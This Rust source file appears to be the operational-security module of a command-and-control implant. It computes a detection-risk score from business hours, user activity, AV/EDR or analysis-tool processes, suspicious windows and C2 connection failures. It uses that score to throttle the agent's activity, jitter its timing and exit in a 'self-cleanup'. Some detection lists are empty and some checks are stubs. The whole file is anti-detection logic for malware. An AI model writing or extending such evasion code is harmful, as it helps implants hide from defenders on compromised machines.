use chrono::Datelike;
use log::{debug, warn, info};
use std::sync::Mutex;
use chrono::Timelike;
use once_cell::sync::Lazy;
use std::time::{Duration, Instant};
use serde::{Serialize, Deserialize};
use crate::state::MEMORY_PROTECTOR;
use zeroize::Zeroize;

// --- OPSEC Scoring Constants ---
const SCORE_DECAY_FACTOR: f32 = 0.95;
const SCORE_CLAMP_MIN: f32 = 0.0;
const SCORE_CLAMP_MAX: f32 = 100.0;

// Signal Weights
const WEIGHT_HIGH_THREAT_PROCESS: f32 = 40.0;
const WEIGHT_BUSINESS_HOURS: f32 = 2.0;
const WEIGHT_USER_ACTIVE: f32 = 15.0;
const WEIGHT_SUSPICIOUS_WINDOW: f32 = 30.0;
const WEIGHT_C2_UNSTABLE: f32 = 25.0;
const WEIGHT_NOISY_COMMAND_EXECUTION: f32 = 20.0;

// Threshold Adjustment Constants
const THRESHOLD_ADJUSTMENT_STABLE: f32 = 10.0;
const THRESHOLD_ADJUSTMENT_UNSTABLE: f32 = -10.0;
const THRESHOLD_MIN_CLAMP: f32 = 10.0;
const THRESHOLD_MAX_CLAMP: f32 = 90.0;

// Static lists (empty for now)
static HIGH_THREAT_ANALYSIS_TOOLS: Lazy<Vec<String>> = Lazy::new(|| vec![]);
static COMMON_AV_EDR_PROCESSES: Lazy<Vec<String>> = Lazy::new(|| vec![]);
static SUSPICIOUS_WINDOW_TITLES: Lazy<Vec<String>> = Lazy::new(|| vec![]);

#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
pub struct OpsecState {
    pub mode: AgentMode,
    pub current_score: f32,
    pub consecutive_c2_failures: u32,
    pub dynamic_max_c2_failures: u32,
    pub dynamic_threshold_initialized: bool,
    //  Add missing fields - use u64 timestamp instead of Instant for serialization
    pub last_noisy_command_time: Option<u64>, // Unix timestamp in seconds
    pub last_transition: u64, // Unix timestamp in seconds
    pub last_c2_threshold_adjustment: u64, // Unix timestamp in seconds
}

//  CRITICAL: Implement Zeroize for OpsecState
impl Zeroize for OpsecState {
    fn zeroize(&mut self) {
        // Zeroize numeric fields
        self.current_score = 0.0;
        self.consecutive_c2_failures = 0;
        self.dynamic_max_c2_failures = 0;
        self.dynamic_threshold_initialized = false;
        self.last_noisy_command_time = None;
        self.last_transition = 0;
        self.last_c2_threshold_adjustment = 0;
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum OpsecLevel {
    High,
    Low,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum AgentMode {
    FullOpsec,
    ReducedActivity,
    BackgroundOpsec
}

#[derive(Debug)]
struct OpsecContext {
    pub is_business_hours: bool,
    pub user_idle_level: OpsecLevel,
    pub high_threat_process_detected: bool,
    pub suspicious_window_detected: bool,
    pub c2_connection_unstable: bool,
}

impl Default for OpsecContext {
    fn default() -> Self {
        Self {
            is_business_hours: false,
            user_idle_level: OpsecLevel::Low,
            high_threat_process_detected: false,
            suspicious_window_detected: false,
            c2_connection_unstable: false,
        }
    }
}

//  Helper function to get current timestamp
fn now_timestamp() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

//  Helper function to check if timestamp is within duration
fn timestamp_elapsed_secs(timestamp: u64) -> u64 {
    let now = now_timestamp();
    now.saturating_sub(timestamp)
}

// MAKE these functions PUBLIC for use in command_shell.rs
pub fn with_opsec_state<F, R>(accessor: F) -> R 
where F: Fn(&OpsecState) -> R,  //  Change FnOnce to Fn
{
    let protector = MEMORY_PROTECTOR.lock().unwrap();
    match protector.with_opsec_state(&accessor) {
        Ok(result) => result,
        Err(_) => {
            // Return default state if decryption fails
            let default_state = OpsecState {
                mode: AgentMode::FullOpsec,
                current_score: 100.0,
                consecutive_c2_failures: 0,
                dynamic_max_c2_failures: 5,
                dynamic_threshold_initialized: false,
                last_noisy_command_time: None,
                last_transition: now_timestamp(),
                last_c2_threshold_adjustment: now_timestamp(),
            };
            accessor(&default_state)
        }
    }
}

pub fn with_opsec_state_mut<F, R>(updater: F) -> R 
where F: Fn(&mut OpsecState) -> R,  //  Change FnOnce to Fn
{
    let mut protector = MEMORY_PROTECTOR.lock().unwrap();
    match protector.with_opsec_state_mut(&updater) {
        Ok(result) => result,
        Err(_) => {
            // Create and update default state if decryption fails
            let mut default_state = OpsecState {
                mode: AgentMode::FullOpsec,
                current_score: 100.0,
                consecutive_c2_failures: 0,
                dynamic_max_c2_failures: 5,
                dynamic_threshold_initialized: false,
                last_noisy_command_time: None,
                last_transition: now_timestamp(),
                last_c2_threshold_adjustment: now_timestamp(),
            };
            let result = updater(&mut default_state);
            // Try to store the updated state (ignore errors)
            let _ = protector.encrypt_opsec_state(&default_state);
            result
        }
    }
}

pub fn determine_agent_mode(config: &crate::config::AgentConfig) -> AgentMode {
    with_opsec_state_mut(|opsec_state| {
        adjust_c2_failure_threshold(opsec_state, config);
    });

    let mut context = OpsecContext::default();
    context.is_business_hours = check_business_hours();
    context.user_idle_level = check_idle_level();
    context.suspicious_window_detected = check_window_state();
    context.c2_connection_unstable = check_c2_stability();

    let current_score = with_opsec_state(|state| state.current_score);

    let mut base_interval = config.proc_scan_interval_secs;
    if context.is_business_hours { base_interval = base_interval.min(120); }
    if current_score > 75.0 { base_interval = base_interval.min(30); }
    else if current_score > 40.0 { base_interval = base_interval.min(60); }
    if context.user_idle_level == OpsecLevel::Low { base_interval = base_interval.max(300); }

    let jitter = rand::random::<u64>() % 61;
    let adaptive_interval = base_interval + jitter;
    debug!(
        "[OPSEC INTERVAL] Adaptive Interval: {}s (Base: {}, Jitter: {}, Score: {:.1}, Idle: {:?})",
        adaptive_interval, config.proc_scan_interval_secs, jitter, current_score, context.user_idle_level
    );

    context.high_threat_process_detected = check_proc_state(adaptive_interval);

    with_opsec_state_mut(|opsec_state| {
        update_opsec_score_and_mode(opsec_state, &context, config)
    })
}

fn update_opsec_score_and_mode(
    opsec_state: &mut OpsecState,
    context: &OpsecContext,
    config: &crate::config::AgentConfig
) -> AgentMode {
    // 1. Apply Decay
    opsec_state.current_score *= SCORE_DECAY_FACTOR;

    // 2. Add Weighted Contributions
    let mut score_increase: f32 = 0.0;
    let user_is_active = context.user_idle_level == OpsecLevel::High;
    
    if context.is_business_hours {
        score_increase += WEIGHT_BUSINESS_HOURS;
    }
    if user_is_active {
        score_increase += WEIGHT_USER_ACTIVE;
    }
    if context.high_threat_process_detected {
        score_increase += WEIGHT_HIGH_THREAT_PROCESS;
        warn!("[OPSEC] High threat process detected! Score increase: +{}", WEIGHT_HIGH_THREAT_PROCESS);
    }
    if context.suspicious_window_detected {
        score_increase += WEIGHT_SUSPICIOUS_WINDOW;
        warn!("[OPSEC] Suspicious window detected! Score increase: +{}", WEIGHT_SUSPICIOUS_WINDOW);
    }
    if context.c2_connection_unstable {
        score_increase += WEIGHT_C2_UNSTABLE;
        warn!("[OPSEC] C2 connection unstable! Score increase: +{}", WEIGHT_C2_UNSTABLE);
    }
    
    // Check for recent noisy command execution
    if let Some(last_noisy) = opsec_state.last_noisy_command_time {
        let time_since_noisy = timestamp_elapsed_secs(last_noisy);
        if time_since_noisy < 300 { // Within 5 minutes
            score_increase += WEIGHT_NOISY_COMMAND_EXECUTION;
            debug!("[OPSEC] Recent noisy command ({}s ago). Score increase: +{}", time_since_noisy, WEIGHT_NOISY_COMMAND_EXECUTION);
        }
    }

    opsec_state.current_score += score_increase;
    opsec_state.current_score = opsec_state.current_score.clamp(SCORE_CLAMP_MIN, SCORE_CLAMP_MAX);

    // 3. Determine Mode
    let low_threshold = config.base_score_threshold_bg_to_reduced;
    let high_threshold = config.base_score_threshold_reduced_to_full;
    
    let new_mode = if opsec_state.current_score >= high_threshold {
        AgentMode::FullOpsec
    } else if opsec_state.current_score >= low_threshold {
        AgentMode::ReducedActivity
    } else {
        AgentMode::BackgroundOpsec
    };

    // 4. Handle Mode Transitions
    if new_mode != opsec_state.mode {
        info!("[OPSEC] Mode transition: {:?} -> {:?} (Score: {:.1})", opsec_state.mode, new_mode, opsec_state.current_score);
        opsec_state.mode = new_mode;
        opsec_state.last_transition = now_timestamp();
    }

    new_mode
}

pub fn perform_self_cleanup() -> ! {
    warn!("[OPSEC] Performing self-cleanup due to high threat detection");
    std::process::exit(0);
}

fn check_business_hours() -> bool {
    let now = chrono::Local::now();
    let hour = now.hour();
    let weekday = now.weekday();
    
    // Monday=1 to Friday=5, 9 AM to 5 PM
    matches!(weekday.number_from_monday(), 1..=5) && (9..=17).contains(&hour)
}

fn check_idle_level() -> OpsecLevel {
    // Simplified: always return Low for now
    OpsecLevel::Low
}

// FIX: Use timestamp-based cache instead of Instant to avoid Windows overflow
static PROC_SCAN_CACHE: Lazy<Mutex<(u64, bool)>> = Lazy::new(|| Mutex::new((0, false)));

pub fn check_proc_state(proc_scan_interval: u64) -> bool {
    let mut cache = PROC_SCAN_CACHE.lock().unwrap();
    let (last_scan, last_result) = *cache;
    
    let now = now_timestamp();
    if now.saturating_sub(last_scan) < proc_scan_interval {
        debug!("[OPSEC] Using cached process scan result: {}", last_result);
        return last_result;
    }

    // Simplified process check - always return false for now
    let threat_detected = false;
    *cache = (now, threat_detected);
    
    if threat_detected {
        warn!("[OPSEC] Threat process detected!");
    } else {
        debug!("[OPSEC] No threat processes detected");
    }
    
    threat_detected
}

fn check_window_state() -> bool {
    // Simplified: always return false for now
    false
}

fn check_c2_stability() -> bool {
    with_opsec_state(|state| {
        let threshold = state.dynamic_max_c2_failures;
        let unstable = state.consecutive_c2_failures >= threshold;
        if unstable {
            warn!(
                "[OPSEC C2] Stability check FAILED: {} failures >= dynamic threshold {}",
                state.consecutive_c2_failures, threshold
            );
        } else {
            debug!(
                "[OPSEC C2] Stability check OK: {} failures < dynamic threshold {}",
                state.consecutive_c2_failures, threshold
            );
        }
        unstable
    })
}

fn adjust_c2_failure_threshold(
    opsec_state: &mut OpsecState,
    config: &crate::config::AgentConfig,
) {
    if !opsec_state.dynamic_threshold_initialized {
        opsec_state.dynamic_max_c2_failures = config.base_max_consecutive_c2_failures;
        opsec_state.dynamic_threshold_initialized = true;
        opsec_state.last_c2_threshold_adjustment = now_timestamp();
        debug!("[OPSEC C2] Initialized dynamic threshold to: {}", opsec_state.dynamic_max_c2_failures);
        return;
    }

    let adjustment_interval_secs = 600; // 10 minutes
    if timestamp_elapsed_secs(opsec_state.last_c2_threshold_adjustment) < adjustment_interval_secs {
        return;
    }

    let user_idle = check_idle_level() == OpsecLevel::Low;
    let business_hours = check_business_hours();
    
    let adjustment = if user_idle && !business_hours {
        THRESHOLD_ADJUSTMENT_STABLE
    } else {
        THRESHOLD_ADJUSTMENT_UNSTABLE
    };

    let old_threshold = opsec_state.dynamic_max_c2_failures;
    let new_threshold = ((old_threshold as f32) + adjustment)
        .clamp(THRESHOLD_MIN_CLAMP, THRESHOLD_MAX_CLAMP) as u32;

    if new_threshold != old_threshold {
        opsec_state.dynamic_max_c2_failures = new_threshold;
        info!(
            "[OPSEC C2] Dynamic threshold adjusted: {} -> {} (user_idle: {}, business_hours: {})",
            old_threshold, new_threshold, user_idle, business_hours
        );
    }

    opsec_state.last_c2_threshold_adjustment = now_timestamp();
}